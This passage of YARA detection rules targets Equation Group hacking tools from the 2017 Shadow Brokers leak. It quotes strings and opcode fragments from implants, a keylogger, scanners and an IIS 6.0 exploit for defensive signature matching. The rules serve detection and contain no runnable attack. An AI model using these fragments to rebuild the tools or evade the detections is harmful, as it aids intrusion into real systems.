score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"66ff332f84690642f4e05891a15bf0c9783be2a64edb2ef2d04c9205b47deb19\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"-xd = dump archive data & store in scancodes.txt\" fullword ascii\n      $x2 = \"-------- driver start token -------\" fullword wide\n      $x3 = \"-------- keystart token -------\" fullword wide\n      $x4 = \"-xta = same as -xt but show special chars & store in keys_all.txt\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 800KB and 2 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_AdUser_Implant_RID376E : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:38:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"fd2efb226969bc82e2e38769a10a8a751138db69f4594a8de4b3c0522d4d885f\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".?AVFeFinallyFailure@@\" fullword ascii\n      $s2 = \"(&(objectCategory=person)(objectClass=user)(cn=\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 40KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_RemoteExecute_Implant_RID3A69 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 19:45:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"770663c07c519677316934cf482e500a73540d9933342c425f3e56258e6e6d8b\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { 53 00 63 00 68 00 65 00 64 00 75 00 6C 00 65 00\n               00 00 00 00 53 00 65 00 72 00 76 00 69 00 63 00\n               65 00 73 00 41 00 63 00 74 00 69 00 76 00 65 00\n               00 00 00 00 FF FF FF FF 00 00 00 00 B0 17 00 68\n               5C 00 70 00 69 00 70 00 65 00 5C 00 53 00 65 00\n               63 00 6F 00 6E 00 64 00 61 00 72 00 79 00 4C 00\n               6F 00 67 00 6F 00 6E 00 00 00 00 00 5C 00 00 00\n               57 00 69 00 6E 00 53 00 74 00 61 00 30 00 5C 00\n               44 00 65 00 66 00 61 00 75 00 6C 00 74 00 00 00\n               6E 00 63 00 61 00 63 00 6E 00 5F 00 6E 00 70 00\n               00 00 00 00 5C 00 70 00 69 00 70 00 65 00 5C 00\n               53 00 45 00 43 00 4C 00 4F 00 47 00 4F 00 4E } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 40KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_Banner_Implant9x_RID3831 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:10:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"5d69a8cfc9b636448f023fcf18d111f13a8e6bcb9a693eb96276e0d796ab4e0c\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".?AVFeFinallyFailure@@\" fullword ascii\n      $op1 = { c9 c3 57 8d 85 2c eb ff ff } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 20KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_greatdoc_dll_config_RID39AF : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 19:14:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"fd9d0abfa727784dd07562656967d220286fc0d63bcf7e2c35d4c02bc2e5fc2e\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"C:\\\\Projects\\\\GREATERDOCTOR\\\\trunk\\\\GREATERDOCTOR\" ascii\n      $x2 = \"src\\\\build\\\\Release\\\\dllConfig\\\\dllConfig.pdb\" ascii\n      $x3 = \"GREATERDOCTOR [ commandline args configuration ]\" fullword ascii\n      $x4 = \"-useage: <scanner> \\\"<cmdline args>\\\"\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_scanner_RID34E0 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 15:49:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f180bdb247687ea9f1b58aded225d5c80a13327422cd1e0515ea891166372c53\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"+daemon_version,system,processor,refid,clock\" fullword ascii\n      $x2 = \"Usage: %s typeofscan IP_address\" fullword ascii\n      $x3 = \"# scanning ip  %d.%d.%d.%d\" fullword ascii\n      $x4 = \"Welcome to the network scanning tool\" fullword ascii\n      $x5 = \"***** %s ***** (length %d)\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 90KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_Mcl_NtMemory_Std_RID3836 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:11:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"087db4f2dbf8e0679de421fec8fb2e6dd50625112eb232e4acc1408cc0bcd2d7\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { 44 24 37 50 c6 44 24 38 72 c6 44 } \n      $op2 = { 44 24 33 6f c6 44 24 34 77 c6 } \n      $op3 = { 3b 65 c6 44 24 3c 73 c6 44 24 3d 73 c6 44 24 3e } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_tacothief_RID35AD : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:23:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c71953cc84c27dc61df8f6f452c870a7880a204e9e21d9fd006a5c023b052b35\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"File too large!  Must be less than 655360 bytes.\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_ntevt_RID3427 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 15:18:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4254ee5e688fc09bdc72bcc9c51b1524a2bb25a9fb841feaf03bc7ec1a9975bf\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"c:\\\\ntevt.pdb\" fullword ascii\n      $s1 = \"ARASPVU\" fullword ascii\n      $op1 = { 41 5a 41 59 41 58 5f 5e 5d 5a 59 5b 58 48 83 c4 } \n      $op2 = { f9 48 03 fa 48 33 c0 8a 01 49 03 c1 49 f7 e0 88 } \n      $op3 = { 01 41 f6 e0 49 03 c1 88 01 48 33 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 700KB and $x1 or 3 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_Processes_Target_RID3873 : APT DEMO EXE FILE T1047 T1057 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:21:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"69cf7643dbecc5f9b4b29edfda6c0295bc782f0e438f19be8338426f30b4cc74\"\n      tags = \"APT, DEMO, EXE, FILE, T1047, T1057\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Select * from Win32_Process\" fullword ascii\n      $s3 = \"\\\\\\\\%ls\\\\root\\\\cimv2\" fullword wide\n      $s5 = \"%4ls%2ls%2ls%2ls%2ls%2ls.%11l[0-9]%1l[+-]%6s\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_st_lp_RID3418 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 15:15:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3b6f756cca096548dcad2b6c241c1dafd16806c060bec82a530f4d38755286a2\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Previous command: set injection processes (status=0x%x)\" fullword ascii\n      $x2 = \"Secondary injection process is <null> [no secondary process will be used]\" fullword ascii\n      $x3 = \"Enter the address to be used as the spoofed IP source address (xxx.xxx.xxx.xxx) -> \" fullword ascii\n      $x4 = \"E: Execute a Command on the Implant\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_EpWrapper_RID358C : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:17:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a8eed17665ee22198670e22458eb8c9028ff77130788f24f44986cce6cebff8d\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"* Failed to get remote TCP socket address\" fullword wide\n      $x2 = \"* Failed to get 'LPStart' export\" fullword wide\n      $s5 = \"Usage: %ls <logdir> <dll_search_path> <dll_to_load_path> <socket>\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 20KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_DiBa_Target_2000_RID372D : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:27:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f9ea8ff5985b94f635d03f3aab9ad4fb4e8c2ad931137dba4f8ee8a809421b91\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"0M1U1Z1p1\" fullword ascii\n      $op1 = { f4 65 c6 45 f5 6c c6 45 f6 33 c6 45 f7 32 c6 45 } \n      $op2 = { 36 c6 45 e6 34 c6 45 e7 50 c6 45 e8 72 c6 45 e9 } \n      $op3 = { c6 45 e8 65 c6 45 e9 70 c6 45 ea 74 c6 45 eb 5f } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 3 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_DllLoad_Target_RID3758 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:34:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a42d5201af655e43cefef30d7511697e6faa2469dc4a74bc10aa060b522a1cf5\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"BzWKJD+\" fullword ascii\n      $op1 = { 44 24 6c 6c 88 5c 24 6d } \n      $op2 = { 44 24 54 63 c6 44 24 55 74 c6 44 24 56 69 } \n      $op3 = { 44 24 5c 6c c6 44 24 5d 65 c6 44 24 5e } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_EXPA_RID3324 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 14:35:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2017176d3b5731a188eca1b71c50fb938c19d6260c9ff58c7c9534e317d315f8\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"* The target is IIS 6.0 but is not running content indexing servicess,\" fullword ascii\n      $x2 = \"--ver 6 --sp <service_pack> --lang <language> --attack shellcode_option[s]sL\" fullword ascii\n      $x3 = \"By default, the shellcode will attempt to immediately connect s$\" fullword ascii\n      $x4 = \"UNEXPECTED SHELLCODE CONFIGURATION ERRORs\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 12000KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_RemoteExecute_Target_RID39FB : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 19:27:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4a649ca8da7b5499821a768c650a397216cdc95d826862bf30fcc4725ce8587f\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Win32_Process\" fullword ascii\n      $s2 = \"\\\\\\\\%ls\\\\root\\\\cimv2\" fullword wide\n      $op1 = { 83 7b 18 01 75 12 83 63 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_DS_ParseLogs_RID367C : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:57:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0228691d63038b072cdbf50782990d505507757efbfa87655bb2182cf6375956\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"* Size (%d) of remaining capture file is too small to contain a valid header\" fullword wide\n      $x2 = \"* Capture header not found at start of buffer\" fullword wide\n      $x3 = \"Usage: %ws <capture_file> <results_prefix>\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_Oracle_Implant_RID3780 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:41:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"8e9be4960c62ed7f210ce08f291e410ce0929cd3a86fe70315d7222e3df4587e\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op0 = { fe ff ff ff 48 89 9c 24 80 21 00 00 48 89 ac 24 } \n      $op1 = { e9 34 11 00 00 b8 3e 01 00 00 e9 2a 11 00 00 b8 } \n      $op2 = { 48 8b ca e8 bf 84 00 00 4c 8b e0 8d 34 00 44 8d } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_DmGz_Target_RID362E : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:44:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"5964966041f93d5d0fb63ce4a85cf9f7a73845065e10519b0947d4a065fdbdf2\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\\\\\.\\\\%ls\" fullword ascii\n      $s3 = \"6\\\"6<6C6H6M6Z6f6t6\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_SetResourceName_RID37EB : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:59:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"537793d5158aecd0debae25416450bd885725adfc8ca53b0577a3df4b0222e2e\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Updates the name of the dll or executable in the resource file\" fullword ascii\n      $x2 = \"*NOTE: SetResourceName does not work with PeddleCheap versions\" fullword ascii\n      $x3 = \"2 = [appinit.dll] level4 dll\" fullword ascii\n      $x4 = \"1 = [spcss32.exe] level3 exe\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_drivers_Implant_RID3829 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:09:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ee8b048f1c6ba821d92c15d614c2d937c32aeda7b7ea0943fd4f640b57b1c1ab\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".?AVFeFinallyFailure@@\" fullword ascii\n      $s2 = \"hZwLoadDriver\" fullword ascii\n      $op1 = { b0 01 e8 58 04 00 00 c3 33 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 30KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_Shares_Target_RID3722 : APT DEMO EXE FILE T1047 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:25:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6c57fb33c5e7d2dee415ae6168c9c3e0decca41ffe023ff13056ff37609235cb\"\n      tags = \"APT, DEMO, EXE, FILE, T1047\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Select * from Win32_Share\" fullword ascii\n      $s2 = \"slocalhost\" fullword wide\n      $s3 = \"\\\\\\\\%ls\\\\root\\\\cimv2\" fullword wide\n      $s4 = \"\\\\\\\\%ls\\\\%ls\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_ntfltmgr_RID3564 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:11:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3df61b8ef42a995b8f15a0d38bc51f2f08f8d9a2afa1afc94c6f80671cf4a124\"\n      hash2 = \"f7a886ee10ee6f9c6be48c20f370514be62a3fd2da828b0dff44ff3d485ff5c5\"\n      hash3 = \"980954a2440122da5840b31af7e032e8a25b0ce43e071ceb023cca21cedb2c43\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"wCw3wDwAw2wNw@wEwZw2wDwEwBwZwFwFw4w2wZw5w1w4wFwZwGwOwGwGwEw5w2wFwGwDwFwOw\" fullword ascii\n      $s6 = \"w+w;w2w0w6w4w.w(wRw\" fullword ascii\n      $op1 = { 80 f7 ff ff 49 89 84 34 18 02 00 00 41 83 a4 34 } \n      $op2 = { ff 15 0b 34 00 00 eb 92 } \n      $op3 = { 4d 8d b4 34 08 02 00 00 4d 85 f6 0f 84 ae } \n      $op4 = { 8b ca 2b ce 8d 34 01 0f b7 3e 66 3b 7d f0 89 75 } \n      $op5 = { 8a 40 01 00 c7 47 70 } \n      $op6 = { e9 3c ff ff ff 6a ff 8d 45 f0 50 e8 27 11 00 00 } \n      $op7 = { 8b 45 08 53 57 8b 7d 0c c7 40 34 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 4 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_DiBa_Target_BH_RID36F5 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:18:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7ae9a247b60dc31f424e8a7a3b3f1749ba792ff1f4ba67ac65336220021fce9f\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op0 = { 44 89 20 e9 40 ff ff ff 8b c2 48 8b 5c 24 60 48 } \n      $op1 = { 45 33 c9 49 8d 7f 2c 41 ba } \n      $op2 = { 89 44 24 34 eb 17 4c 8d 44 24 28 8b 54 24 30 48 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_PC_LP_RID3384 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 14:51:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3a505c39acd48a258f4ab7902629e5e2efa8a2120a4148511fe3256c37967296\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"* Failed to get connection information.  Aborting launcher!\" fullword wide\n      $s2 = \"Format: <command> <target port> [lp port]\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_RemoteCommand_Lp_RID383C : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:12:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"57b47613a3b5dd820dae59fc6dc2b76656bd578f015f367675219eb842098846\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Failure parsing command from %hs:%u: os=%u plugin=%u\" fullword wide\n      $s2 = \"Unable to get TCP listen port: %08x\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_lp_mstcp_RID3558 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:09:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2ab1e1d23021d887759750a0c053522e9149b7445f840936bbc7e703f8700abd\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\Registry\\\\User\\\\CurrentUser\\\\\" wide\n      $s2 = \"_PacketNDISRequestComplete@12\\\"\" fullword ascii\n      $s3 = \"_LDNdis5RegDeleteKeys@4\" ascii\n      $op1 = { 89 7e 04 75 06 66 21 46 02 eb } \n      $op2 = { fc 74 1b 8b 49 04 0f b7 d3 66 83 } \n      $op3 = { aa 0f b7 45 fc 8b 52 04 8d 4e } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( all of ( $s* ) or all of ( $op* ) ) )\n}\n\nrule EquationGroup_Toolset_Apr17_renamer_RID34E0 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 15:49:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9c30331cb00ae8f417569e9eb2c645ebbb36511d2d1531bb8d06b83781dfe3ac\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"FILE_NAME_CONVERSION.LOG\" fullword wide\n      $s2 = \"Log file exists. You must delete it!!!\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_PC_Exploit_RID35CD : APT DEMO EXE EXPLOIT FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:28:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"77486bb828dba77099785feda0ca1d4f33ad0d39b672190079c508b3feb21fb0\"\n      tags = \"APT, DEMO, EXE, EXPLOIT, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\\\\\.\\\\pipe\\\\pcheap_reuse\" fullword wide\n      $s2 = \"**** FAILED TO DUPLICATE SOCKET ****\" fullword wide\n      $s3 = \"**** UNABLE TO DUPLICATE SOCKET TYPE %u ****\" fullword wide\n      $s4 = \"YOU CAN IGNORE ANY 'ServiceEntry returned error' messages after this...\" fullword wide\n   condition: \n      ( uint16 